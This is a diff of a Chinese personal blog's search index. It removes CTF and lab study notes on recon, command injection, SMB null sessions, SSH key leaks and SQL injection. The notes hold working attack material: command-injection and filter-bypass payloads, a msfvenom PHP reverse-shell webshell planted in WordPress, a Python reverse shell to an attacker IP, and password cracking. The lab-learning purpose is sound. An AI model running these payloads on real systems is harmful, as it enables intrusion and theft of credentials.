+<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
+                      alt="image-20240921191124399"
+                ></p>
+]]></content>
+      <categories>
+        <category>common</category>
+      </categories>
+      <tags>
+        <tag>common</tag>
+        <tag>校园网</tag>
+      </tags>
   </entry>
   <entry>
     <title>Python从入门到精通（工具准备篇）——0. PyCharm+Anaconda+jupyter 的安装（呕心沥血版 ）</title>
@@ -987,794 +1777,6 @@
         <tag>python</tag>
         <tag>common</tag>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctf 基本思路</title>
-    <url>/2024/09/11/93f6ba8bb1f2/</url>
-    <content><![CDATA[<h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>在扫描的全部信息里寻找是否为http服务</p>
-</blockquote>
-<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
-<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
-<p>注意到flag.txt，打开获得flag</p>
-<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
-<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
-<p>在浏览器输入</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
-
-<p> 匿名登录ftp服务器根目录</p>
-<p>发现flag</p>
-<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
-<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
-
-<p>然后依次打开robots.txt中的目录</p>
-<p>发现命令执行窗口</p>
-<p>于是想到命令注入</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
-</blockquote>
-<p>找到在home下的用户Summer</p>
-<p>然后利用ssh远程连接</p>
-<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
-<p>于是利用这个端口进行连接</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
-
-<p>于是得到反弹shell</p>
-<p>利用pwd ls cat more等命令</p>
-<p>查看flag</p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>common</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SambaSMB信息泄露（Serve Message Block)</title>
-    <url>/2024/09/11/cfb8804dd1b5/</url>
-    <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
-<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
-<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
-<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
-<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
-<p>1. </p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
-<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
-<p>连接mysql</p>
-<p><code>mysql -h ip -u user -p</code></p>
-<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
-<p><code>ssh 用户名@ip</code></p>
-<p>尝试数据库密码，密码错误</p>
-</li>
-<li><p>针对SMB协议远程溢出漏洞进行分析</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
-
-<p>发现也没有漏洞</p>
-</li>
-</ol>
-<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
-<p>扫描到网站后台目录</p>
-<p>打开并输入用户名和密码</p>
-<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
-<p>我们将webshell上传到editor的404.php页面</p>
-<p>然后打开404页面</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
-
-<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
-
-<p>发现获得服务器的通用权限</p>
-<p>优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>查看当前计算机的用户</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
-
-<p>查看敏感用户，发现一个togie</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ssh密钥泄露</title>
-    <url>/2024/09/11/478a9824d4db/</url>
-    <content><![CDATA[<h1 id="ssh密钥泄露"><a href="#ssh密钥泄露" class="headerlink" title="ssh密钥泄露"></a>ssh密钥泄露</h1><p>&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D;</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="先用nmap扫描ip端口"><a href="#先用nmap扫描ip端口" class="headerlink" title="先用nmap扫描ip端口"></a>先用nmap扫描ip端口</h3><p>探测靶场开放的服务和服务版本：<code>nmap -sV ip</code></p>
-<p>探测靶场全部信息：<code>nmap -A -v ip</code></p>
-<p>探测靶场的操作系统类型和版本： <code>nmap -O ip</code></p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<hr>
-<h3 id="扫描端口目录-寻找隐藏文件"><a href="#扫描端口目录-寻找隐藏文件" class="headerlink" title="扫描端口目录,寻找隐藏文件"></a>扫描端口目录,寻找隐藏文件</h3><p><code>dirb http://ip:port/</code>（80端口可省略）</p>
-<p>如果探测到.ssh，则可以想到密钥泄露，通过ssh远程登陆</p>
-<p>&#x3D;&#x3D;id_rsa和id_rsa.pub配对成功才能登陆成功&#x3D;&#x3D;</p>
-<p>为此我们可以尝试打开<code>http://ip:port/.ssh/id_rsa</code>目录，可能会下载到id_rsa，也就是私钥</p>
-<hr>
-<h3 id="寻找ssh用户名，得到私钥"><a href="#寻找ssh用户名，得到私钥" class="headerlink" title="寻找ssh用户名，得到私钥"></a>寻找ssh用户名，得到私钥</h3><ol>
-<li><p>然后依次打开后面的目录<br>成功下载后，第二个文件就是一个认证文件，可以找到用户名，ssh连接徐娅用户名，假如用户名为simon</p>
-</li>
-<li><p>可能在网站主页寻找</p>
-</li>
-</ol>
-<p><code>ssh -i id_rsa simon@ip</code></p>
-<hr>
-<h4 id="利用nikto寻找是否有私钥"><a href="#利用nikto寻找是否有私钥" class="headerlink" title="利用nikto寻找是否有私钥"></a>利用nikto寻找是否有私钥</h4><p><code>nikto -host ip</code></p>
-<p>可以扫描出敏感目录并且提示 </p>
-<p>如果探测到robot.txt，打开可以查看不可以被探测的目录，可以寻找到相关信息或者flag1；&#x3D;&#x3D;注意config之类的文件&#x3D;&#x3D;</p>
-<p>可以利用<code>wget url</code>来下载文件</p>
-<h4 id="如果只有公钥"><a href="#如果只有公钥" class="headerlink" title="如果只有公钥"></a>如果只有公钥</h4><p>然后会提示输入密码，尝试root&#x2F;用户名。错误则继续探测</p>
-<p>ssh2john id_rsa &gt; rsacrack</p>
-<p>zcat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz | john –pipe -rules isacrack</p>
-<p>然后利用破解的密码进行ssh登录</p>
-<hr>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="暴力破解思路"><a href="#暴力破解思路" class="headerlink" title="暴力破解思路"></a>暴力破解思路</h3><p>先下载cupp</p>
-<p><code>git clone https://github.com/jeanphorn/common-password.git</code></p>
-<p>进入目录给cupp.py提权 <code>chmod +x cupp.py</code></p>
-<p>以交互方式创建字典 <code>./cupp.py -i</code></p>
-<p>利用metasploit破解ssh</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts ip</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> username name(对应用户名)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file name.txt(前面生成的字典)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> threads 5(设置线程)</span><br><span class="line"></span><br><span class="line">show options(查看参数)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> verbose <span class="literal">true</span>(返回相关信息)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>破解密码后，重新启动msfconsole，并输入相关参数，但是密码直接设置为破解出来的密码pwd</p>
-<p><code>set password pwd</code></p>
-<p>打开会话</p>
-<p><code>sessions -i l</code></p>
-<p>优化终端</p>
-<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
-<p>然后输入</p>
-<p><code>su - root</code></p>
-<p>输入破解出来的密码pwd，成功提权</p>
-<hr>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>挖掘是否有定时任务 &#96;car &#x2F;etc&#x2F;crontab</p>
-<p>如果有定时计划文件但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限</p>
-<p>如果有定时执行的文件，可以切换到对应目录，查看对应权限，查看当前用户是否有读写权限</p>
-<p>反弹shell编写</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">`#!/usr/bin/python`</span><br><span class="line"></span><br><span class="line">`import os,subprocess,socket`</span><br><span class="line"></span><br><span class="line">`s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)`(参数可不加，表示使用以太网和tcp套接字)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;攻击机IP地址&quot;,&quot;攻击机监听端口”))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line"></span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-¡&quot;])</span><br></pre></td></tr></table></figure></div>
-
-<p>攻击机netcat命令监听相关端口（未占用）</p>
-<p><code>nc -lvp 端口</code></p>
-<p>查看占用端口 <code>netstat -pantu</code></p>
-<hr>
-<h3 id="利用自带文件产生溢出调用bash"><a href="#利用自带文件产生溢出调用bash" class="headerlink" title="利用自带文件产生溢出调用bash"></a>利用自带文件产生溢出调用bash</h3><p>登陆后发现不是root权限，于是查看根目录</p>
-<p><code>cd /root</code>  <code>ls</code></p>
-<p>可能会发现flag.txt，但是可能没有权限直接打开</p>
-<p>于是查找具有root权限的文件</p>
-<p><code>find / -perm -4000 2&gt;/dev/null</code></p>
-<p>发现read_message名字与根目录类似</p>
-<p><code>cat read_message.c</code></p>
-<p>可能会找到flag2</p>
-<p>代码审计下面的c语言</p>
-<p>发现调用这个message这个文件并输出相关信息</p>
-<p>打开read_message</p>
-<p><code>read_message</code></p>
-<p>然后我们输入SimonAAA</p>
-<p>发现程序只对比到前五个字符，正确就执行程序，于是我们打算溢出字符串buf数组（20长度），然后利用输入的&#x2F;bin&#x2F;sh占用程序，被execve调用，然后成功提权</p>
-<hr>
-<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p>寻找根目录  <code>/root</code></p>
-<p>然后就可以成功打开flag.txt文件</p>
-<hr>
-<h2 id="NOTE"><a href="#NOTE" class="headerlink" title="NOTE"></a>NOTE</h2><ol>
-<li>查看当前用户<code>whoami</code></li>
-<li>查看当前用户的权限<code>id</code></li>
-<li>查看所有用户的列表 <code>cat/etc/passwd</code></li>
-<li>查看用户组 <code>cat /etc/group</code></li>
-<li>查看属于某些用户的文件<code>find / -user 用户名</code></li>
-<li>查看缓冲文件目录 <code>/tmp</code></li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>ssh</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入（web界面）</title>
-    <url>/2024/09/11/f366e274d4aa/</url>
-    <content><![CDATA[<h1 id="sql注入（web界面）"><a href="#sql注入（web界面）" class="headerlink" title="sql注入（web界面）"></a>sql注入（web界面）</h1><p>进入mysql命令行</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases; # 显示所有数据库</span><br><span class="line">use database_name; # 进入某个数据库</span><br><span class="line">show tables; # 显示所有表名</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 向数据库插入数据</span><br><span class="line">insert into 表名(字段1,字段2,...) values(值1,值2,...);</span><br><span class="line"># example</span><br><span class="line">insert into guestbook(comment,name) values(&#x27;welcome&#x27;,&#x27;web&#x27;);</span><br><span class="line"></span><br><span class="line"># 修改数据库的数据</span><br><span class="line">update 表名 set 字段名=&quot;值&quot; [where 条件];</span><br><span class="line"># example</span><br><span class="line">update guestbook set comment = &#x27;I love study&#x27;;</span><br><span class="line">update guestbook set comment = &#x27;I love study&#x27; where name=&#x27;web14&#x27;;</span><br><span class="line"></span><br><span class="line"># 向数据库查询数据</span><br><span class="line">select * from 表名;</span><br><span class="line">select */字段 from 表名 [where 条件]; # *表示全部</span><br><span class="line"># example</span><br><span class="line">select * from guestbook;</span><br><span class="line">select name,comment from guestbook where comment_id=2;</span><br><span class="line"></span><br><span class="line"># 删除数据库的数据</span><br><span class="line">delete from 表名 where 条件; # 必须有where条件</span><br><span class="line"># example</span><br><span class="line">delete from guestbook where comment_id=2;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Information-schema数据库"><a href="#Information-schema数据库" class="headerlink" title="Information_schema数据库"></a>Information_schema数据库</h3><ol>
-<li><h3 id="CHARACTER-SETS-表"><a href="#CHARACTER-SETS-表" class="headerlink" title="CHARACTER_SETS 表"></a>CHARACTER_SETS 表</h3><p>提供了 mysql 可用字符集的信息。<code>SHOW CHARACTER SET;</code> 命令从这个表获取结果。</p>
-</li>
-<li><h3 id="SCHEMATA-表"><a href="#SCHEMATA-表" class="headerlink" title="&#x3D;&#x3D;SCHEMATA 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;SCHEMATA 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;当前 mysql 实例中所有数据库的信息。<code>SHOW DATABASES;</code> 命令从这个表获取数据。&#x3D;&#x3D;</p>
-</li>
-<li><h3 id="TABLES-表"><a href="#TABLES-表" class="headerlink" title="&#x3D;&#x3D;TABLES 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;TABLES 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。<code>SHOW TABLES FROM XX;</code> 命令从这个表获取结果。&#x3D;&#x3D;</p>
-</li>
-<li><h3 id="COLUMNS-表"><a href="#COLUMNS-表" class="headerlink" title="&#x3D;&#x3D;COLUMNS 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;COLUMNS 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;存储表中的列信息，包括表有多少列、每个列的类型等。<code>SHOW COLUMNS FROM schemaname.tablename</code> 命令从这个表获取结果。&#x3D;&#x3D; </p>
-</li>
-<li><h3 id="USER-PRIVILEGES-表"><a href="#USER-PRIVILEGES-表" class="headerlink" title="USER_PRIVILEGES 表"></a>USER_PRIVILEGES 表</h3><p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
-</li>
-</ol>
-<blockquote>
-<p>其余查看<a class="link"   href="https://blog.csdn.net/kikajack/article/details/80065753" >MySQL 中的 information_schema 数据库_object ‘profiling’ not found within ‘information_s-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h2 id="sql注入语句"><a href="#sql注入语句" class="headerlink" title="sql注入语句"></a>sql注入语句</h2><h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1. 判断是否存在漏洞"></a>1. 判断是否存在漏洞</h3><p>根据客户端返回的结果判断提交的测试语句 是否执行成功，如果被执行，则可能存在漏洞</p>
-<p>一般利用&#x3D;&#x3D;单引号和双引号&#x3D;&#x3D;来判断，如果SQL语句出现错误说明有很大可能存在漏洞。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1</span><br><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<p>这里加上单引号语句报错，则可能存在漏洞</p>
-<p>后端向数据库获取数据的语句</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;$id&#x27;;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="2-判断注入类型"><a href="#2-判断注入类型" class="headerlink" title="2. 判断注入类型"></a>2. 判断注入类型</h3><h4 id="字符型或者数字型"><a href="#字符型或者数字型" class="headerlink" title="字符型或者数字型"></a>字符型或者数字型</h4><p>涉及注入中是否加入单引号，可以使用&#x3D;&#x3D;and&#x3D;&#x3D;进行判断，当and两边都为真才是真。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and 1=1</span><br><span class="line">1 and 1=2</span><br><span class="line"># 字符型</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;1 and 1=1&#x27;;</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;1 and 1=2&#x27;;</span><br><span class="line"># 数字型</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= 1 and 1=1;</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= 1 and 1=2;</span><br></pre></td></tr></table></figure></div>
-
-<p>如果两个返回结果相同则为字符型，否则就是数字型。字符型会进行隐式类型转换，这是自动调用的，将某种类型的数据转换成另外一种类型数据。如上面的user_id是int型，但是输入字符型就会转换为int型。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;1 and 1=1&#x27; ==&gt; 1</span><br><span class="line">&#x27;2admin&#x27; ==&gt; 2</span><br><span class="line">&#x27;admin&#x27; ==&gt; 0</span><br><span class="line">&#x27;33admin&#x27; ==&gt; 33</span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="1-判断列数"><a href="#1-判断列数" class="headerlink" title="1. 判断列数"></a>1. 判断列数</h3><p>利用&#x3D;&#x3D;order by&#x3D;&#x3D;</p>
-<p>判断后端的查询语句的输出有几列</p>
-<p>ORDER BY是表示输出的字段按照某一列进行排序，可以跟字段名，也可以跟列号</p>
-<p>如果为字符型</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1# </span><br><span class="line"># 上面的单引号是跟前面的单引号闭合，然后因为后面还有个单引号，所以需要井号来进行注释</span><br><span class="line">注 ：如果是GET型注入，可以利用井号的url编码%23进行注释或者利用--+</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="2-确定显示位"><a href="#2-确定显示位" class="headerlink" title="2. 确定显示位"></a>2. 确定显示位</h3><p>利用union将两个语句进行连接并输出</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users union SELECT password,last_name FROM users</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>上面五行是前一个语句的输出，后面五行是后一个语句的输出。</p>
-<blockquote>
-<p>注：</p>
-<ol>
-<li><p>输出结果的列名总是第一个语句中的列名</p>
-</li>
-<li><p>UNION内部语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时每条SELECT语句中的列的顺序也必须相同</p>
-</li>
-</ol>
-</blockquote>
-<p>如果某些网站只能回显一条数据</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></div>
-
-<p>就是将第一个语句查询为空</p>
-<h3 id="3-获取数据信息"><a href="#3-获取数据信息" class="headerlink" title="3.  获取数据信息"></a>3.  获取数据信息</h3><h4 id="3-1-获取数据库名、版本"><a href="#3-1-获取数据库名、版本" class="headerlink" title="3.1 获取数据库名、版本"></a>3.1 获取数据库名、版本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure></div>
-
